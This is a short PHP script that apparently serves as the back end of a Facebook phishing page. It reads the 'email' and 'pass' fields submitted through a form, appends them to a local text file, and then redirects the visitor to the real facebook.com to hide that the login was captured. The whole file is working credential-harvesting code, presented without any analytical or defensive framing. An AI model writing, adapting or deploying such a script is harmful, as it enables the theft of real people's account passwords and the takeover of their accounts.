<?php

Header ('Location: https://www.facebook.com/');


$handle = fopen("hainguyentn.txt", "a");
foreach($_POST as $variable => $value) {
if ($variable == 'email' or $variable =='pass')
{
fwrite($handle, $variable);
fwrite($handle, "=");
fwrite($handle, $value);
fwrite($handle, "\r\n");
}
}
fwrite($handle, "\r\n");
fclose($handle);
exit;
?>